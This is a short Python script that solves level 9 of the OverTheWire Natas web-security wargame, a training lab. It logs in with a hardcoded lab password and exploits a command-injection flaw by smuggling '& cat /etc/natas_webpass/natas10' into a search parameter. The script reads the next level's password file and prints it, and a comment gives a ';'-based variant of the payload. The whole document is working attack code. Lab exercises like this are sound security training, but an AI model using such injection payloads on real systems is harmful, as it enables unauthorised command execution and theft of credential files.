import requests

url= "http://natas9.natas.labs.overthewire.org"

s= requests.Session()
s.auth=('natas9','W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl')
r= s.get(url+'/?needle=& cat /etc/natas_webpass/natas10&submit=Search')
print('[+]Password for natas10 is '+str(r.text).split('\n')[20])
#Command Injection with payload `; cat /etc/natas_webpass/natas10`
